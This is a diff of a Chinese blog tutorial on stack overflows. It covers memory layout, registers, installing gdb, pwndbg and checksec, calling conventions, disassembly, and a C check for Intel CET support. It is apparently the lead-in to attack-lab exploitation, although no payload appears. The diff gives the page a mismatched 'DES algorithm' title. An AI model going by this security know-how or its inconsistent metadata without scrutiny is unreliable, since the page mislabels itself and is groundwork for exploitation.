@@ -20,44 +20,56 @@
     var CONFIG = {"hostname":"nexuslbh.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="$StackOverflow！$">
+  <meta name="description" content="栈溢出计算机安全导论+CS:APP+PWN">
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出">
-<meta property="og:url" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:title" content="DES算法实现——Lab">
+<meta property="og:url" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="Meta Field">
-<meta property="og:description" content="$StackOverflow！$">
+<meta property="og:description" content="栈溢出计算机安全导论+CS:APP+PWN">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/ELF.jpg">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/s1.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/rc.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/fc.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/call.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/tar1.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/sygk.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/ctarget1.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/test.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/getbuf.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/touch1.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/l1s.jpg">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/level1res.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/gdb01.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/b1.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/gf01.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/gf02.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/touch2.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/2d.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/level2res.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/rsp03.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/l3jqm.png">
-<meta property="og:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/level3res.png">
-<meta property="article:published_time" content="2022-10-04T03:48:14.000Z">
-<meta property="article:modified_time" content="2022-10-12T10:27:53.605Z">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/ELF.jpg">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/s1.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/rc.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/fc.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/call.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/CETth.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/tar1.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/sygk.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/chc.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/ctarget1.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/test.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/getbuf.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/touch1.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/level1res.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/gdb01.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/b1.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/gf01.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/gf02.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/touch2.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/2d.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/level2res.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/rsp03.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/l3jqm.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/level3res.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/chrt.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/c001.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/c002.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/r001.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/r002.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/AAA.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/popq01.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/4889c7.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/l4res.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/lea.png">
+<meta property="og:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/l5res.png">
+<meta property="article:published_time" content="2022-10-13T15:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-13T15:03:04.798Z">
 <meta property="article:author" content="NexusXDUlbh">
 <meta property="article:tag" content="SEC">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/ELF.jpg">
+<meta name="twitter:image" content="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/ELF.jpg">
 
-<link rel="canonical" href="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+<link rel="canonical" href="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/">
 
 
 <script id="page-configurations">
@@ -70,7 +82,7 @@
   };
 </script>
 
-  <title>栈溢出 | Meta Field</title>
+  <title>DES算法实现——Lab | Meta Field</title>
   
 
 
@@ -224,7 +236,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://nexuslbh.top/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+    <link itemprop="mainEntityOfPage" href="http://nexuslbh.top/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/arch.png">
@@ -237,7 +249,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          栈溢出
+          DES算法实现——Lab
         </h1>
 
         <div class="post-meta">
@@ -246,16 +258,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2022-10-04 11:48:14" itemprop="dateCreated datePublished" datetime="2022-10-04T11:48:14+08:00">2022-10-04</time>
+              <time title="创建时间：2022-10-13 23:00:00 / 修改时间：23:03:04" itemprop="dateCreated datePublished" datetime="2022-10-13T23:00:00+08:00">2022-10-13</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-10-12 18:27:53" itemprop="dateModified" datetime="2022-10-12T18:27:53+08:00">2022-10-12</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -275,8 +281,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/" itemprop="commentCount"></span>
+    <a title="valine" href="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -286,14 +292,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>13k</span>
+              <span>20k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>12 分钟</span>
+              <span>18 分钟</span>
             </span>
 
         </div>
@@ -305,14 +311,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>$StackOverflow！$</p>
+        <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>计算机安全导论+CS:APP+PWN</p>
 <span id="more"></span>
 <h2 id="0x01-从栈与内存谈起"><a href="#0x01-从栈与内存谈起" class="headerlink" title="0x01.从栈与内存谈起"></a>0x01.从栈与内存谈起</h2><p>栈我们已经学过了，它是一种连续存储的数据结构，具有LIFO的性质。这种数据结构在计算机系统中使用非常广泛，最典型的就是在内存中的栈，我们称之为<strong>栈内存（Stack Memory）</strong>。提到内存，一般指的是<strong>RAM（Random-Access Memory）</strong>。</p>
 <p>x86体系中，栈顶由堆栈指针寄存器ESP来标记，是32位的寄存器，里面<strong>存放着</strong>最后一个压入栈顶的内容的<strong>内存地址</strong>，正是因为有ESP寄存器来管理，所以从底层就实现了一种“自动化”。</p>
 <p>一段<strong>程序执行前在硬盘中</strong>的存储模型如下（ELF是可执行程序的英文缩写）：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/ELF.jpg" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/ELF.jpg" style="zoom:50%;"></p>
 <p>一段<strong>程序执行时在内存中</strong>的存储模型如下：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/s1.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/s1.png" style="zoom:60%;"></p>
 <p>首先明确一件事：栈由<strong>高</strong>地址$\to$<strong>低</strong>地址增长，下面分块讲解：</p>
 <p><strong>未映射区域</strong>:这一部分用于捕捉使用空指针和小整型值的指针引用内存情况，通常就占几KB。</p>
 <p><strong>文本段</strong>:包含程序的指令,一般情况下程序的文本内容和大小都不会改变。64位Linux环境下地址总是从0x08048000处开始。</p>
@@ -323,23 +329,26 @@
 <p>✍Windows默认栈大小是1MB，Linux默认栈大小是10MB。</p>
 <h2 id="0x02-为什么要讲栈溢出"><a href="#0x02-为什么要讲栈溢出" class="headerlink" title="0x02.为什么要讲栈溢出"></a>0x02.为什么要讲栈溢出</h2><p>在计算机安全领域，缓冲区溢出是个古老而经典的话题，栈溢出是缓冲区溢出的一种。由于缓冲区溢出使得有用的存储单元被改写，往往会引发不可预料的后果。利用栈溢出最经典的当属蠕虫<strong>病毒</strong>。下图是波士顿科学博物馆保存的存有蠕虫源代码的磁盘。</p>
 <p>程序员在平时写程序时也会遇到栈溢出的情况，比如死循环或者递归层数太深。</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/rc.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/rc.png" style="zoom: 67%;"></p>
 <h2 id="0x03-涉及底层与应用"><a href="#0x03-涉及底层与应用" class="headerlink" title="0x03.涉及底层与应用"></a>0x03.涉及底层与应用</h2><h3 id="（1）寄存器"><a href="#（1）寄存器" class="headerlink" title="（1）寄存器"></a>（1）寄存器</h3><p><strong>bp</strong>:存储当前函数状态的基地址/栈帧的栈底地址，<strong>在函数运行时不变（这很关键）</strong>，可以用来索引确定函数参数或局部变量的位置。</p>
 <p><strong>sp</strong>:存储函数调用栈的<strong>栈顶</strong>地址，在压栈和出栈时发生变化。</p>
 <p><strong>ip</strong>:指向<strong>相邻的下一条指令</strong>，如此反复，程序就得以连续执行指令。</p>
 <p><strong>ax</strong>:存放函数返回值。</p>
 <p><strong>e</strong>表示32位，<strong>r</strong>表示64位</p>
-<h3 id="（2）GDB与PWNDBG"><a href="#（2）GDB与PWNDBG" class="headerlink" title="（2）GDB与PWNDBG"></a>（2）GDB与PWNDBG</h3><h4 id="GDB安装"><a href="#GDB安装" class="headerlink" title="GDB安装"></a>GDB安装</h4><p>环境:64位Ubuntu20.04-Linux</p>
+<h3 id="（2）GDB、PWNDBG、Checksec"><a href="#（2）GDB、PWNDBG、Checksec" class="headerlink" title="（2）GDB、PWNDBG、Checksec"></a>（2）GDB、PWNDBG、Checksec</h3><h4 id="GDB安装"><a href="#GDB安装" class="headerlink" title="GDB安装"></a>GDB安装</h4><p>环境:64位Ubuntu20.04-Linux</p>
 <p>安装：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  apt-get install gdb</span><br></pre></td></tr></table></figure>
-<h4 id="PWNDBG安装"><a href="#PWNDBG安装" class="headerlink" title="PWNDBG安装"></a>PWNDBG安装</h4><p>PWNDBG实际上就是一个升级版的GDB，更偏向于安全开发人员、逆向工程师</p>
+<h4 id="PWNDBG安装"><a href="#PWNDBG安装" class="headerlink" title="PWNDBG安装"></a>PWNDBG安装</h4><p><code>pwndbg</code>实际上就是一个升级版的GDB，更偏向于安全开发人员、逆向工程师</p>
 <p>安装：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg.git</span><br><span class="line">cd /pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
 <p>安装插件依赖：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install keystone-engine ropper keystone-engine</span><br></pre></td></tr></table></figure>
-<p>我当时安装PWNDBG时遇到了这样的问题：由于网络波动（梯子突然掉了），脚本执行中间被迫退出，重新进入时提示此目录不为空，即使删掉对应目录也无济于事。于是我就在先解决脚本对应行的问题，然后逐一执行脚本里其余的命令。</p>
+<p>我当时安装<code>pwndbg</code>时遇到了这样的问题：由于网络波动（梯子突然掉了），脚本执行中间被迫退出，重新进入时提示此目录不为空，即使删掉对应目录也无济于事。于是我就在先解决脚本对应行的问题，然后逐一执行脚本里其余的命令。</p>
 <h4 id="PWNDBG使用"><a href="#PWNDBG使用" class="headerlink" title="PWNDBG使用"></a>PWNDBG使用</h4><p>本质就是GDB的使用</p>
 <p>推荐教程：<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html">《100个gdb使用小技巧》</a></p>
+<h4 id="Checksec安装与使用"><a href="#Checksec安装与使用" class="headerlink" title="Checksec安装与使用"></a>Checksec安装与使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/slimm609/checksec.sh</span><br><span class="line">sudo cp checksec /usr/local/bin/</span><br><span class="line">checksec</span><br></pre></td></tr></table></figure>
+<p>基本使用：查看开启哪些保护机制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>
 <h3 id="（3）函数调用约定"><a href="#（3）函数调用约定" class="headerlink" title="（3）函数调用约定"></a>（3）函数调用约定</h3><p>又是<strong>栈</strong>！栈支持参数传递。</p>
 <div class="table-container">
 <table>
@@ -374,41 +383,45 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP IP ;出栈，传入指令指针寄存器，然后从IP对应处开始执行</span><br></pre></td></tr></table></figure>
 <p><strong>函数调用栈</strong>是程序运行时内存中一段连续的区域，用来实现程序的函数调用机制。每个未退出的函数都会在函数调用栈中拥有一块数据区，我们叫函数的栈帧。</p>
 <p>每一个进程在用户态都对应一个调用栈结构</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/fc.png" alt></p>
-<p>函数的调用栈帧中，保存了相应的函数的一些重要信息：函数中使用的局部变量，函数的参数，另外还有一些维护函数栈所需要的数据。主调用函数我们叫caller，被调用函数叫callee，举个例子：main函数（caller）调用func（callee）函数。</p>
-<p>函数调用栈的核心是：将主调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态并保存。</p>
-<p>函数结束时和核心是：丢弃被调用函数（callee）的状态，并将栈顶恢复为主调用函数（caller）的状态。</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/fc.png" alt></p>
+<p>函数的调用栈帧中，保存了相应的函数的一些重要信息：函数中使用的局部变量，函数的参数，另外还有一些维护函数栈所需要的数据。主调用函数我们叫<code>caller</code>，被调用函数叫<code>callee</code>，举个例子：<code>main()</code>函数(caller)调用<code>func()</code>(callee)函数。</p>
+<p>函数调用栈的核心是：将主调用函数(caller)的状态保存起来，同时创建被调用函数(callee)的状态并保存。</p>
+<p>函数结束时和核心是：丢弃被调用函数(callee)的状态，并将栈顶恢复为主调用函数(caller)的状态。</p>
 <p>👉函数调用栈的整体布局：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/call.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/call.png" style="zoom:67%;"></p>
 <p>为了更好理解上面的过程，我们在64位linux上进行实践：</p>
 <p>先编辑这样的一个源程序：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//one1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     f();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在对应路径下的终端输入：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o one1.out one1.c</span><br><span class="line">gdb one1.out</span><br></pre></td></tr></table></figure>
-<p>此时进入pwndbg调试环境，对函数f和main分别进行反汇编：</p>
+<p>此时进入<code>pwndbg</code>调试环境，对函数<code>f()</code>和<code>main()</code>分别进行反汇编：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble f</span><br><span class="line">Dump of assembler code for function f:</span><br><span class="line">   0x0000000000001129 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x000000000000112d &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x000000000000112e &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001131 &lt;+8&gt;:	nop</span><br><span class="line">   0x0000000000001132 &lt;+9&gt;:	pop    rbp</span><br><span class="line">   0x0000000000001133 &lt;+10&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001134 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001138 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000000000001139 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x000000000000113c &lt;+8&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001141 &lt;+13&gt;:	call   0x1129 &lt;f&gt;</span><br><span class="line">   0x0000000000001146 &lt;+18&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000000114b &lt;+23&gt;:	pop    rbp</span><br><span class="line">   0x000000000000114c &lt;+24&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 <p>shell里面三列分别表示：</p>
 <p>①<code>0x0000000000001129</code>:该条指令对应的<strong>虚拟内存地址</strong></p>
 <p>②<code>&lt;+0&gt;</code>:该指令的虚拟内存地址偏移量</p>
 <p>③<code>endbr64</code>:汇编指令</p>
 <p>👋在<strong>最新版的编译器</strong>中一个函数被调用默认完成以下动作：</p>
-<p>①执行<code>endbr64</code>，intel在硬件层面实现了对<strong>控制流(Control-Flow Enforcement Technology(CET))</strong>的相应检查防御措施，而指令endbr64就是其中之一，相当于一个NOP指令，但是用于监控间接跳转。</p>
-<p>这段在stackoverflow论坛上有一个回答比较详细：</p>
+<p>①执行<code>endbr64</code>，intel在硬件层面实现了对<strong>控制流(Control-Flow Enforcement Technology(CET))</strong>的相应检查防御措施，而指令<code>endbr64</code>就是其中之一，相当于一个<code>NOP</code>指令，但是用于监控间接跳转。<code>Intel CET</code>技术在<code>Tiger Lake</code>架构的CPU上受到了支持，比如<code>Intel Core i7-1185G7E</code>处理器。</p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/CETth.png" alt></p>
+<p>$stackoverflow$上有一个回答比较详细：</p>
 <p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/56905811/what-does-the-endbr64-instruction-actually-do">推荐回答</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/kohnakagawa/fb77904fcc44fc5652ef6d338c35a718">github</a>也提供了检测CPU是否开启CET技术的方法：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cet.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cpuid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cpu_supports_cet_shadow_stack</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> eax = <span class="number">0</span>, ebx = <span class="number">0</span>, ecx = <span class="number">0</span>, edx = <span class="number">0</span>;</span><br><span class="line">    __cpuid_count(<span class="number">7</span>, <span class="number">0</span>, eax, ebx, ecx, edx);</span><br><span class="line">    <span class="keyword">return</span> (ecx &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cpu_supports_cet_ibt</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> eax = <span class="number">0</span>, ebx = <span class="number">0</span>, ecx = <span class="number">0</span>, edx = <span class="number">0</span>;</span><br><span class="line">    __cpuid_count(<span class="number">7</span>, <span class="number">0</span>, eax, ebx, ecx, edx);</span><br><span class="line">    <span class="keyword">return</span> (edx &amp; (<span class="number">1</span> &lt;&lt; <span class="number">20</span>)) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cpu_supports_cet_shadow_stack()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;CET Shadow Stack is supported&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cpu_supports_cet_ibt()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;CET IBT is supported&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc cet.c -o cet.out</span><br><span class="line">./cet.out</span><br></pre></td></tr></table></figure>
